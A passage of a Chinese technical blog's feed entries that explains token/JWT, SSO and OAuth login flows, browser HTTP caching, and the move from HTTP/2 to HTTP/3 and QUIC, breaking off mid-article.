class="headerlink" title="Token 登录"></a>Token 登录</h2><p>为了解决 Session + Cookie 机制暴露出的诸多问题，我们可以使用 Token 的登录方式。</p><blockquote><p>Token 是服务端生成的一串字符串，以作为客户端请求的一个令牌。当第一次登录后，服务器会生成一个 Token 并返回给客户端，客户端后续访问时，只需带上这个 Token 即可完成身份认证。</p></blockquote><h3 id="Token-机制实现流程"><a href="#Token-机制实现流程" class="headerlink" title="Token 机制实现流程"></a>Token 机制实现流程</h3><p>用户首次登录时：</p><ol><li>用户输入账号密码，并点击登录。</li><li>服务器端验证账号密码无误，创建 Token。</li><li>服务器端将 Token 返回给客户端，由<strong>客户端自由保存</strong>。</li></ol><p>后面的访问中带上第一次登录时获取的 Token，服务器就可以验证 Token 的有效性。</p><h3 id="Token-机制的特点"><a href="#Token-机制的特点" class="headerlink" title="Token 机制的特点"></a>Token 机制的特点</h3><ul><li>服务器端不需要存放 Token，所以不会对服务器端造成压力，即使是服务器集群，也不需要增加维护成本。</li><li>Token 可以存放在前端任何地方，可以不用保存在 Cookie 中，提升了页面的安全性。</li><li>Token 下发之后，只要在生效时间之内，就一直有效，如果服务器端想收回此 Token 的权限，并不容易。</li></ul><h3 id="Token-的生成方式"><a href="#Token-的生成方式" class="headerlink" title="Token 的生成方式"></a>Token 的生成方式</h3><p>最常见的 Token 生成方式是使用 JWT（Json Web Token），它是一种简洁的，自包含的方法用于通信双方之间以 JSON 对象的形式安全的传递信息。</p><p>上文中我们说到，使用 Token 后，服务器端并不会存储 Token，那怎么判断客户端发过来的 Token 是合法有效的呢？</p><p>答案其实就在 Token 字符串中，其实 Token 并不是一串杂乱无章的字符串，而是通过多种算法拼接组合而成的字符串，我们来具体分析一下。</p><p>JWT 算法主要分为 3 个部分：header（头信息），playload（消息体），signature（签名）。</p><p>header 部分指定了该 JWT 使用的签名算法:</p><pre><code class="hljs jsx">header = <span class="hljs-string">&#x27;&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;&#x27;</span>   <span class="hljs-comment">// `HS256` 表示使用了 HMAC-SHA256 来生成签名。</span></code></pre><p>playload 部分表明了 JWT 的意图：</p><pre><code class="hljs jsx">payload = <span class="hljs-string">&#x27;&#123;&quot;loggedInAs&quot;:&quot;admin&quot;,&quot;iat&quot;:1422779638&#125;&#x27;</span>     <span class="hljs-comment">//iat 表示令牌生成的时间</span></code></pre><p>signature 部分为 JWT 的签名，主要为了让 JWT 不能被随意篡改，签名的方法分为两个步骤：</p><ol><li>输入 <code>base64url</code> 编码的 header 部分、 <code>.</code> 、<code>base64url</code> 编码的 playload 部分，输出 unsignedToken。</li><li>输入服务器端私钥、unsignedToken，输出 signature 签名。</li></ol><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> base64Header = encodeBase64(header)<span class="hljs-keyword">const</span> base64Payload = encodeBase64(payload)<span class="hljs-keyword">const</span> unsignedToken = <span class="hljs-string">`<span class="hljs-subst">$&#123;base64Header&#125;</span>.<span class="hljs-subst">$&#123;base64Payload&#125;</span>`</span><span class="hljs-keyword">const</span> key = <span class="hljs-string">&#x27;服务器私钥&#x27;</span>signature = HMAC(key, unsignedToken)</code></pre><p>最后的 Token 计算如下：</p><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> base64Header = encodeBase64(header)<span class="hljs-keyword">const</span> base64Payload = encodeBase64(payload)<span class="hljs-keyword">const</span> base64Signature = encodeBase64(signature)token = <span class="hljs-string">`<span class="hljs-subst">$&#123;base64Header&#125;</span>.<span class="hljs-subst">$&#123;base64Payload&#125;</span>.<span class="hljs-subst">$&#123;base64Signature&#125;</span>`</span></code></pre><p>服务器在判断 Token 时：</p><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> [base64Header, base64Payload, base64Signature] = token.split(<span class="hljs-string">&#x27;.&#x27;</span>)<span class="hljs-keyword">const</span> signature1 = decodeBase64(base64Signature)<span class="hljs-keyword">const</span> unsignedToken = <span class="hljs-string">`<span class="hljs-subst">$&#123;base64Header&#125;</span>.<span class="hljs-subst">$&#123;base64Payload&#125;</span>`</span><span class="hljs-keyword">const</span> signature2 = HMAC(<span class="hljs-string">&#x27;服务器私钥&#x27;</span>, unsignedToken)<span class="hljs-keyword">if</span>(signature1 === signature2) &#123;  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;签名验证成功，token 没有被篡改&#x27;</span>&#125;<span class="hljs-keyword">const</span> payload =  decodeBase64(base64Payload)<span class="hljs-keyword">if</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>() - payload.iat &lt; <span class="hljs-string">&#x27;token 有效期&#x27;</span>)&#123;  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;token 有效&#x27;</span>&#125;</code></pre><p>有了 Token 之后，登录方式已经变得非常高效，接下来我们介绍另外两种登录方式。</p><h2 id="SSO-机制实现流程"><a href="#SSO-机制实现流程" class="headerlink" title="SSO 机制实现流程"></a>SSO 机制实现流程</h2><p>用户首次访问时，需要在认证中心登录：</p><ol><li>用户访问网站 <code>a.com</code> 下的 pageA 页面。</li><li>由于没有登录，则会重定向到认证中心，并带上回调地址 <code>www.sso.com?return_uri=a.com/pageA</code>，以便登录后直接进入对应页面。</li><li>用户在认证中心输入账号密码，提交登录。</li><li>认证中心验证账号密码有效，然后重定向 <code>a.com?ticket=123</code> 带上授权码 ticket，并将认证中心 <code>sso.com</code> 的登录态写入 Cookie。</li><li>在 <code>a.com</code> 服务器中，拿着 ticket 向认证中心确认，授权码 ticket 真实有效。</li><li>验证成功后，服务器将登录信息写入 Cookie（此时客户端有 2 个 Cookie 分别存有 <code>a.com</code> 和 <code>sso.com</code> 的登录态）。</li></ol><p>认证中心登录完成之后，继续访问 <a href="http://a.com/">a.com</a> 下的其他页面时，由于 <a href="http://a.com/">a.com</a> 存在已登录的 Cookie 信息，所以服务器端直接认证成功。</p><p>如果认证中心登录完成之后，访问 <a href="http://b.com/">b.com</a> 下的页面。这个时候，由于认证中心存在之前登录过的 Cookie，所以也不用再次输入账号密码，直接返回第 4 步，下发 ticket 给 <a href="http://b.com/">b.com</a> 即可。</p><h3 id="SSO-单点登录退出"><a href="#SSO-单点登录退出" class="headerlink" title="SSO 单点登录退出"></a>SSO 单点登录退出</h3><p>目前我们已经完成了单点登录，在同一套认证中心的管理下，多个产品可以共享登录态。现在我们需要考虑退出了，即：在一个产品中退出了登录，怎么让其他的产品也都退出登录？</p><p>原理其实不难，可以回过头来看第 5 步，每一个产品在向认证中心验证 ticket 时，其实可以顺带将自己的退出登录 api 发送到认证中心。</p><p>当某个产品 <a href="http://c.com/">c.com</a> 退出登录时：</p><ol><li>清空 <code>c.com</code> 中的登录态 Cookie。</li><li>请求认证中心 <code>sso.com</code> 中的退出 api。</li><li>认证中心遍历下发过 ticket 的所有产品，并调用对应的退出 api，完成退出。</li></ol><h2 id="OAuth-第三方登录"><a href="#OAuth-第三方登录" class="headerlink" title="OAuth 第三方登录"></a>OAuth 第三方登录</h2><p>在上文中，我们使用单点登录完成了多产品的登录态共享，但都是建立在一套统一的认证中心下，对于一些小型企业，未免太麻烦，有没有一种登录能够做到开箱即用？</p><p>其实是有的，很多大厂都会提供自己的第三方登录服务，比如微信登录、微博登录、QQ 登录等。我们一起来分析一下。</p><h3 id="OAuth-机制实现流程"><a href="#OAuth-机制实现流程" class="headerlink" title="OAuth 机制实现流程"></a>OAuth 机制实现流程</h3><p>这里以微信开放平台的接入流程为例：</p><ol><li>首先，<code>a.com</code> 的运营者需要在微信开放平台注册账号，并向微信申请使用微信登录功能。</li><li>申请成功后，得到申请的 appid、appsecret。</li><li>用户在 <code>a.com</code> 上选择使用微信登录。</li><li>这时会跳转微信的 OAuth 授权登录，并带上 <code>a.com</code> 的回调地址。</li><li>用户输入微信账号和密码，登录成功后，需要选择具体的授权范围，如：授权用户的头像、昵称等。</li><li>授权之后，微信会根据拉起 <code>a.com?code=123</code> ，这时带上了一个临时票据 code。</li><li>获取 code 之后， <code>a.com</code> 会拿着 code 、appid、appsecret，向微信服务器申请 token，验证成功后，微信会下发一个 token。</li><li>有了 token 之后， <code>a.com</code> 就可以凭借 token 拿到对应的微信用户头像，用户昵称等信息了。</li><li><code>a.com</code> 提示用户登录成功，并将登录状态写入 Cooke，以作为后续访问的凭证。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文介绍了 4 种常见的登录方式，原理应该大家都清楚了，总结一下这 4 种方案的使用场景：</p><ul><li>Cookie + Session 历史悠久，适合于简单的后端架构，需开发人员自己处理好安全问题。</li><li>Token 方案对后端压力小，适合大型分布式的后端架构，但已分发出去的 token ，如果想收回权限，就不是很方便了。</li><li>SSO 单点登录，适用于中大型企业，想要统一内部所有产品的登录方式。</li><li>OAuth 第三方登录，简单易用，对用户和开发者都友好，但第三方平台很多，需要选择合适自己的第三方登录平台。</li></ul>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>鉴权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP缓存</title>
    <link href="/2020/08/17/HTTP%E7%BC%93%E5%AD%98/"/>
    <url>/2020/08/17/HTTP%E7%BC%93%E5%AD%98/</url>
    
    <content type="html"><![CDATA[<p>缓存（Cache）是计算机领域里的一个重要概念，是优化系统性能的利器。</p><p>由于链路漫长，网络时延不可控，浏览器使用 HTTP 获取资源的成本较高。所以，非常有必要把“来之不易”的数据缓存起来，下次再请求的时候尽可能地复用。这样，就可以避免多次请求 - 应答的通信成本，节约网络带宽，也可以加快响应速度。</p><p>试想一下，如果有几十 K 甚至几十 M 的数据，不是从网络而是从本地磁盘获取，那将是多么大的一笔节省，免去多少等待的时间。</p><p>实际上，HTTP 传输的每一个环节基本上都会有缓存，非常复杂。</p><p>基于“请求 - 应答”模式的特点，可以大致分为客户端缓存和服务器端缓存，因为服务器端缓存经常与代理服务“混搭”在一起，所以今天我先讲客户端——也就是浏览器的缓存。</p><h2 id="服务器的缓存控制"><a href="#服务器的缓存控制" class="headerlink" title="服务器的缓存控制"></a>服务器的缓存控制</h2><p>为了更好地说明缓存的运行机制，下面我用“生鲜速递”作为比喻，看看缓存是如何工作的。</p><p>夏天到了，天气很热。你想吃西瓜消暑，于是打开冰箱，但很不巧，冰箱是空的。不过没事，现在物流很发达，给生鲜超市打个电话，不一会儿，就给你送来一个 8 斤的沙瓤大西瓜，上面还贴着标签：“保鲜期 5 天”。好了，你把它放进冰箱，想吃的时候随时拿出来。</p><p>在这个场景里，“生鲜超市”就是 Web 服务器，“你”就是浏览器，“冰箱”就是浏览器内部的缓存。整个流程翻译成 HTTP 就是：</p><ol><li>浏览器发现缓存无数据，于是发送请求，向服务器获取资源。</li><li>服务器响应请求，返回资源，同时标记资源的有效期。</li><li>浏览器缓存资源，等待下次重用。</li></ol><p>服务器标记资源有效期使用的头字段是<strong>“Cache-Control”</strong>，里面的值<strong>“max-age=30”</strong>就是资源的有效时间，相当于告诉浏览器，“这个页面只能缓存 30 秒，之后就算是过期，不能用。”</p><p><strong>“max-age”</strong>是 HTTP 缓存控制最常用的属性，此外在响应报文里还可以用其他的属性来更精确地指示浏览器应该如何使用缓存：</p><ul><li>no-store：<strong>不允许缓存</strong>，用于某些变化非常频繁的数据，例如秒杀页面；</li><li>no-cache：它的字面含义容易与 no-store 搞混，实际的意思并不是不允许缓存，而是<strong>可以缓存</strong>，但在使用之前必须要去服务器验<strong>证是否过期，是否有最新的版本</strong>；</li><li>must-revalidate：又是一个和 no-cache 相似的词，它的意思是<strong>如果缓存不过期就可以继续使用，但过期了如果还想用就必须去服务器验证</strong>。</li></ul><p>听的有点糊涂吧。没关系，我拿生鲜速递来举例说明一下：</p><ul><li>no-store：买来的西瓜不允许放进冰箱，要么立刻吃，要么立刻扔掉；</li><li>no-cache：可以放进冰箱，但吃之前必须问超市有没有更新鲜的，有就吃超市里的；</li><li>must-revalidate：可以放进冰箱，保鲜期内可以吃，过期了就要问超市让不让吃。</li></ul><p>你看，这超市管的还真多啊，西瓜到了家里怎么吃还得听他。不过没办法，在 HTTP 协议里服务器就是这样的“霸气”。</p><h2 id="客户端的缓存控制"><a href="#客户端的缓存控制" class="headerlink" title="客户端的缓存控制"></a>客户端的缓存控制</h2><p>现在冰箱里已经有了“缓存”的西瓜，是不是就可以直接开吃了呢？</p><p>你可以在 Chrome 里点几次“刷新”按钮，估计你会失望，页面上的 ID 一直在变，根本不是缓存的结果，明明说缓存 30 秒，怎么就不起作用呢？</p><p>其实不止服务器可以发“Cache-Control”头，浏览器也可以发“Cache-Control”，也就是说请求 - 应答的双方都可以用这个字段进行缓存控制，互相协商缓存的使用策略。</p><p>当你点“刷新”按钮的时候，浏览器会在请求头里加一个<strong>“Cache-Control: max-age=0”</strong>。因为 max-age 是<strong>“生存时间”</strong>，max-age=0 的意思就是“我要一个最最新鲜的西瓜”，而本地缓存里的数据至少保存了几秒钟，所以浏览器就不会使用缓存，而是向服务器发请求。服务器看到 max-age=0，也就会用一个最新生成的报文回应浏览器。</p><p>Ctrl+F5 的“强制刷新”又是什么样的呢？</p><p>它其实是发了一个“Cache-Control: no-cache”，含义和“max-age=0”基本一样，就看后台的服务器怎么理解，通常两者的效果是相同的。</p><p>那么，浏览器的缓存究竟什么时候才能生效呢？别着急，试着点一下浏览器的“前进”“后退”按钮，再看开发者工具，你就会惊喜地发现“from disk cache”的字样，意思是没有发送网络请求，而是读取的磁盘上的缓存。</p><p>这几个操作与刷新有什么区别呢？其实也很简单，在“前进”“后退”“跳转”这些重定向动作中浏览器不会“夹带私货”，只用最基本的请求头，没有“Cache-Control”，所以就会检查缓存，直接利用之前的资源，不再进行网络通信。</p><h2 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h2><p>浏览器用“Cache-Control”做缓存控制只能是刷新数据，不能很好地利用缓存数据，又因为缓存会失效，使用前还必须要去服务器验证是否是最新版。</p><p>那么该怎么做呢？</p><p>浏览器可以用两个连续的请求组成“验证动作”：先是一个 HEAD，获取资源的修改时间等元信息，然后与缓存数据比较，如果没有改动就使用缓存，节省网络流量，否则就再发一个 GET 请求，获取最新的版本。</p><p>但这样的两个请求网络成本太高了，所以 HTTP 协议就定义了一系列<strong>“If”</strong>开头的<strong>“条件请求”</strong>字段，专门用来检查验证资源是否过期，把两个请求才能完成的工作合并在一个请求里做。而且，验证的责任也交给服务器，浏览器只需“坐享其成”。</p><p>条件请求一共有 5 个头字段，我们最常用的是<strong>“if-Modified-Since”</strong>和<strong>“If-None-Match”</strong>这两个。需要第一次的响应报文预先提供<strong>“Last-modified”</strong>和<strong>“ETag”</strong>，然后第二次请求时就可以带上缓存里的原值，验证资源是否是最新的。</p><p>如果资源没有变，服务器就回应一个“304 Not Modified”，表示缓存依然有效，浏览器就可以更新一下有效期，然后放心大胆地使用缓存了。</p><p>“Last-modified”很好理解，就是文件的最后修改时间。ETag 是什么呢？ETag 是“实体标签”（Entity Tag）的缩写，是资源的一个唯一标识，主要是用来解决修改时间无法准确区分文件变化的问题。比如，一个文件在一秒内修改了多次，但因为修改时间是秒级，所以这一秒内的新版本无法区分。</p><p>再比如，一个文件定期更新，但有时会是同样的内容，实际上没有变化，用修改时间就会误以为发生了变化，传送给浏览器就会浪费带宽。使用 ETag 就可以精确地识别资源的变动情况，让浏览器能够更有效地利用缓存。ETag 还有“强”“弱”之分。</p><p>强 ETag 要求资源在字节级别必须完全相符，弱 ETag 在值前有个“W/”标记，只要求资源在语义上没有变化，但内部可能会有部分发生了改变（例如 HTML 里的标签顺序调整，或者多了几个空格）。</p><p>条件请求里其他的三个头字段是“If-Unmodified-Since”“If-Match”和“If-Range”，其实只要你掌握了“if-Modified-Since”和“If-None-Match”，可以轻易地“举一反三”。</p><h2 id="缓存位置"><a href="#缓存位置" class="headerlink" title="缓存位置"></a>缓存位置</h2><p>前面我们已经提到，当强缓存命中或者协商缓存中服务器返回304的时候，我们直接从缓存中获取资源。那这些资源究竟缓存在什么位置呢？</p><p>浏览器中的缓存位置一共有四种，按优先级从高到低排列分别是：</p><ul><li>Service Worker</li><li>Memory Cache</li><li>Disk Cache</li><li>Push Cache</li></ul><h3 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h3><p>Service Worker 借鉴了 Web Worker的 思路，即让 JS 运行在主线程之外，由于它脱离了浏览器的窗体，因此无法直接访问DOM。虽然如此，但它仍然能帮助我们完成很多有用的功能，比如离线缓存、消息推送和网络代理等功能。其中的离线缓存就是 Service Worker Cache。</p><h3 id="Memory-Cache-和-Disk-Cache"><a href="#Memory-Cache-和-Disk-Cache" class="headerlink" title="Memory Cache 和 Disk Cache"></a>Memory Cache 和 Disk Cache</h3><p>Memory Cache指的是内存缓存，从效率上讲它是最快的。但是从存活时间来讲又是最短的，当渲染进程结束后，内存缓存也就不存在了。</p><p>Disk Cache就是存储在磁盘中的缓存，从存取效率上讲是比内存缓存慢的，但是他的优势在于存储容量和存储时长。稍微有些计算机基础的应该很好理解，就不展开了。</p><p>好，现在问题来了，既然两者各有优劣，那浏览器如何决定将资源放进内存还是硬盘呢？主要策略如下：</p><ul><li>比较大的JS、CSS文件会直接被丢进磁盘，反之丢进内存</li><li>内存使用率比较高的时候，文件优先进入磁盘</li></ul><h3 id="Push-Cache"><a href="#Push-Cache" class="headerlink" title="Push Cache"></a>Push Cache</h3><p>即推送缓存，这是浏览器缓存的最后一道防线。服务器推送是 HTTP/2 中的功能，它指的是，还没有收到浏览器的请求，服务器就把各种资源推送给浏览器。</p><p>比如，浏览器只请求了<code>index.html</code>，但是服务器把<code>index.html</code>、<code>style.css</code>、<code>example.png</code>全部发送给浏览器。这样的话，只需要一轮 HTTP 通信，浏览器就得到了全部资源，提高了性能。</p><p>服务器推送有一个很麻烦的问题。所要推送的资源文件，如果浏览器已经有缓存，推送就是浪费带宽。即使推送的文件版本更新，浏览器也会优先使用本地缓存。</p><p>一种解决办法是，只对第一次访问的用户开启服务器推送。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先通过 <code>Cache-Control</code> 验证强缓存是否可用，如果强缓存可用，直接使用。否则进入协商缓存，即发送 HTTP 请求，服务器通过请求头中的<code>If-Modified-Since</code>或者<code>If-None-Match</code>这些条件请求字段检查资源是否更新。若资源更新，返回资源和200状态码。否则，返回304，告诉浏览器直接从缓存获取资源。</p>]]></content>
    
    
    <categories>
      
      <category>HTTP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
      <tag>HTTP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP的前世今生（二）</title>
    <link href="/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h2><p>HTTP/1.1 发布之后，整个互联网世界呈现出了爆发式的增长，度过了十多年的“快乐时光”，更涌现出了 Facebook、Twitter、淘宝、京东等互联网新贵。</p><p>这期间也出现了一些对 HTTP 不满的意见，主要就是连接慢，无法跟上迅猛发展的互联网，但 HTTP/1.1 标准一直“岿然不动”，无奈之下人们只好发明各式各样的“小花招”来缓解这些问题，比如以前常见的切图、JS 合并等网页优化手段。</p><p>终于有一天，搜索巨头 Google 忍不住了，决定“揭竿而起”，就像马云说的“如果银行不改变，我们就改变银行”。那么，它是怎么“造反”的呢？</p><p>Google 首先开发了自己的浏览器 Chrome，然后推出了新的 SPDY 协议，并在 Chrome 里应用于自家的服务器，如同十多年前的网景与微软一样，从实际的用户方来“倒逼”HTTP 协议的变革，这也开启了第二次的“浏览器大战”。</p><p>历史再次重演，不过这次的胜利者是 Google，Chrome 目前的全球的占有率超过了 60%。“挟用户以号令天下”，Google 借此顺势把 SPDY 推上了标准的宝座，互联网标准化组织以 SPDY 为基础开始制定新版本的 HTTP 协议，最终在 2015 年发布了 HTTP/2，RFC 编号 7540。</p><p>HTTP/2 的制定充分考虑了现今互联网的现状：宽带、移动、不安全，在高度兼容 HTTP/1.1 的同时在性能改善方面做了很大努力，主要的特点有：</p><ol><li><p>多路复用</p><p> <strong>多路复用主要是为了解决 TCP 慢启动和队头阻塞问题</strong>。具体可以参考下图：</p> <img src="/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%BA%8C%EF%BC%89/img.png" class=""><p> 从图中你会发现每个请求都有一个对应的 ID，如 stream1 表示 index.html 的请求，stream2 表示 foo.css 的请求。这样在浏览器端，就可以随时将请求发送给服务器了。</p><p> 服务器端接收到这些请求后，会根据自己的喜好来决定优先返回哪些内容，比如服务器可能早就缓存好了 index.html 和 bar.js 的响应头信息，那么当接收到请求的时候就可以立即把 index.html 和 bar.js 的响应头信息返回给浏览器，然后再将 index.html 和 bar.js 的响应体数据返回给浏览器。之所以可以随意发送，是因为每份数据都有对应的 ID，浏览器接收到之后，会筛选出相同 ID 的内容，将其拼接为完整的 HTTP 响应数据。</p><p> HTTP/2 使用了多路复用技术，可以将请求分成一帧一帧的数据去传输，这样带来了一个额外的好处，就是当收到一个优先级高的请求时，比如接收到 JavaScript 或者 CSS 关键资源的请求，服务器可以暂停之前的请求来优先处理关键资源的请求。</p><p> 多路复用技术的实现原理是添加了一个<strong>二进制分帧层。</strong>数据经过二进制分帧层处理后，会被转换为一个个带有请求 ID 标号的帧，服务器收到所有帧之后，会将所有相同 ID 的帧合并成一个完整的请求信息。然后服务器已同样的方式将响应数据转换为带请求 ID 的帧，再发送给浏览器。浏览器再组合响应数据。</p></li><li><p>可以设置请求的优先级</p><p> 我们知道浏览器中有些数据是非常重要的，但是在发送请求时，重要的请求可能会晚于那些不怎么重要的请求，如果服务器按照请求的顺序来回复数据，那么这个重要的数据就有可能推迟很久才能送达浏览器，这对于用户体验来说是非常不友好的。</p><p> 为了解决这个问题，HTTP/2 提供了请求优先级，可以在发送请求时，标上该请求的优先级，这样服务器接收到请求之后，会优先处理优先级高的请求。</p></li><li><p>服务器推送</p><p> 除了设置请求的优先级外，HTTP/2 还可以直接将数据提前推送到浏览器。你可以想象这样一个场景，当用户请求一个 HTML 页面之后，服务器知道该 HTML 页面会引用几个重要的 JavaScript 文件和 CSS 文件，那么在接收到 HTML 请求之后，附带将要使用的 CSS 文件和 JavaScript 文件一并发送给浏览器，这样当浏览器解析完 HTML 文件之后，就能直接拿到需要的 CSS 文件和 JavaScript 文件，这对首次打开页面的速度起到了至关重要的作用。</p></li><li><p>头部压缩</p><p> 无论是 HTTP/1.1 还是 HTTP/2，它们都有请求头和响应头，这是浏览器和服务器的通信语言。HTTP/2 对请求头和响应头进行了压缩，你可能觉得一个 HTTP 的头文件没有多大，压不压缩可能关系不大，但你这样想一下，在浏览器发送请求的时候，基本上都是发送 HTTP 请求头，很少有请求体的发送，通常情况下页面也有 100 个左右的资源，如果将这 100 个请求头的数据压缩为原来的 20%，那么传输效率肯定能得到大幅提升。</p></li></ol><p>HTTP/2 协议规范于 2015 年 5 月正式发布，在那之后，该协议已在互联网和万维网上得到了广泛的实现和部署。从目前的情况来看，国内外一些排名靠前的站点基本都实现了 HTTP/2 的部署。使用 HTTP/2 能带来 20%～60% 的效率提升，至于 20% 还是 60% 要看优化的程度。总之，我们也应该与时俱进，放弃 HTTP/1.1 和其性能优化方法，去“拥抱”HTTP/2。</p><h2 id="HTTP-3"><a href="#HTTP-3" class="headerlink" title="HTTP/3"></a>HTTP/3</h2><p>看到这里，你可能会问了：“HTTP/2 这么好，是不是就已经完美了呢？”答案是否定的，这一次还是 Google，而且它要“革自己的命”。</p><p>在 HTTP/2 还处于草案之时，Google 又发明了一个新的协议，叫做 QUIC，而且还是相同的“套路”，继续在 Chrome 和自家服务器里试验着“玩”，依托它的庞大用户量和数据量，持续地推动 QUIC 协议成为互联网上的“既成事实”。</p><p>我们再来看看为什么出现了 HTTP/3 ，它的出现是为了解决 HTTP/2 的什么问题。</p><h3 id="TCP-的队头阻塞"><a href="#TCP-的队头阻塞" class="headerlink" title="TCP 的队头阻塞"></a>TCP 的队头阻塞</h3><p>虽然 HTTP/2 解决了应用层面的队头阻塞问题，不过和 HTTP/1.1 一样，HTTP/2 依然是基于 TCP 协议的，而 TCP 最初就是为了单连接而设计的。你可以把 TCP 连接看成是两台计算机之前的一个虚拟管道，计算机的一端将要传输的数据按照顺序放入管道，最终数据会以相同的顺序出现在管道的另外一头。</p><p>接下来我们就来分析下 HTTP/1.1 协议栈中 TCP 是如何传输数据的。为直观理解，你可以参考下图：</p><img src="/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%BA%8C%EF%BC%89/img1.png" class=""><p>通过上图你会发现，从一端发送给另外一端的数据会被拆分为一个个按照顺序排列的数据包，这些数据包通过网络传输到了接收端，接收端再按照顺序将这些数据包组合成原始数据，这样就完成了数据传输。</p><p>不过，如果在数据传输的过程中，有一个数据因为网络故障或者其他原因而丢包了，那么整个 TCP 的连接就会处于暂停状态，需要等待丢失的数据包被重新传输过来。你可以把 TCP 连接看成是一个按照顺序传输数据的管道，管道中的任意一个数据丢失了，那之后的数据都需要等待该数据的重新传输。为了直观理解，你可以参考下图：</p><img src="/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%BA%8C%EF%BC%89/img2.png" class=""><p>我们就把在 TCP 传输过程中，由于单个数据包的丢失而造成的阻塞称为 TCP 上的队头阻塞。那队头阻塞是怎么影响 HTTP/2 传输的呢？首先我们来看正常情况下 HTTP/2 是怎么传输多路请求的，为了直观理解，你可以参考下图：</p><img src="/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%BA%8C%EF%BC%89/img3.png" class=""><p>通过该图，我们知道在 HTTP/2 中，多个请求是跑在一个 TCP 管道中的，如果其中任意一路数据流中出现了丢包的情况，那么就会阻塞该 TCP 连接中的所有请求。这不同于 HTTP/1.1，使用 HTTP/1.1 时，浏览器为每个域名开启了 6 个 TCP 连接，如果其中的 1 个 TCP 连接发生了队头阻塞，那么其他的 5 个连接依然可以继续传输数据。</p><p>所以随着丢包率的增加，HTTP/2 的传输效率也会越来越差。有测试数据表明，当系统达到了 2% 的丢包率时，HTTP/1.1 的传输效率反而比 HTTP/2 表现得更好。</p><h3 id="TCP-协议僵化"><a href="#TCP-协议僵化" class="headerlink" title="TCP 协议僵化"></a>TCP 协议僵化</h3><p>现在我们知道了 TCP 协议存在队头阻塞等缺点，那我们是不是可以通过改进 TCP 协议来解决这些问题呢？</p><p>答案是：非常困难。之所以这样，主要有两个原因。</p><p>第一个是中间设备的僵化。要搞清楚什么是中间设备僵化，我们先要弄明白什么是中间设备。我们知道互联网是由多个网络互联的网状结构，为了能够保障互联网的正常工作，我们需要在互联网的各处搭建各种设备，这些设备就被称为中间设备。</p><p>这些中间设备有很多种类型，并且每种设备都有自己的目的，这些设备包括了路由器、防火墙、NAT、交换机等。它们通常依赖一些很少升级的软件，这些软件使用了大量的 TCP 特性，这些功能被设置之后就很少更新了。</p><p>所以，如果我们在客户端升级了 TCP 协议，但是当新协议的数据包经过这些中间设备时，它们可能不理解包的内容，于是这些数据就会被丢弃掉。这就是中间设备僵化，它是阻碍 TCP 更新的一大障碍。</p><p>除了中间设备僵化外，操作系统也是导致 TCP 协议僵化的另外一个原因。因为 TCP 协议都是通过操作系统内核来实现的，应用程序只能使用不能修改。通常操作系统的更新都滞后于软件的更新，因此要想自由地更新内核中的 TCP 协议也是非常困难的。</p><h3 id="QUIC-协议"><a href="#QUIC-协议" class="headerlink" title="QUIC 协议"></a>QUIC 协议</h3><p>HTTP/2 存在一些比较严重的与 TCP 协议相关的缺陷，但由于 TCP 协议僵化，我们几乎不可能通过修改 TCP 协议自身来解决这些问题，那么解决问题的思路是绕过 TCP 协议，发明一个 TCP 和 UDP 之外的新的传输协议。但是这也面临着和修改 TCP 一样的挑战，因为中间设备的僵化，这些设备只认 TCP 和 UDP，如果采用了新的协议，新协议在这些设备同样不被很好地支持。</p><p>因此，HTTP/3 选择了一个折衷的方法——UDP 协议，基于 UDP 实现了类似于 TCP 的多路数据流、传输可靠性等功能，我们把这套功能称为 QUIC 协议。关于 HTTP/2 和 HTTP/3 协议栈的比较，你可以参考下图：</p><img src="/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%BA%8C%EF%BC%89/img4.png" class=""><p>通过上图我们可以看出，HTTP/3 中的 QUIC 协议集合了以下几点功能。</p><ul><li><p><strong>实现了类似 TCP 的流量控制、传输可靠性的功能</strong>。虽然 UDP 不提供可靠性的传输，但 QUIC 在 UDP 的基础之上增加了一层来保证数据可靠性传输。它提供了数据包重传、拥塞控制以及其他一些 TCP 中存在的特性。</p></li><li><p><strong>集成了 TLS 加密功能</strong>。目前 QUIC 使用的是 TLS1.3，相较于早期版本 TLS1.3 有更多的优点，其中最重要的一点是减少了握手所花费的 RTT 个数。</p></li><li><p><strong>实现了 HTTP/2 中的多路复用功能</strong>。和 TCP 不同，QUIC 实现了在同一物理连接上可以有多个独立的逻辑数据流（如下图）。实现了数据流的单独传输，就解决了 TCP 中队头阻塞的问题。</p>  <img 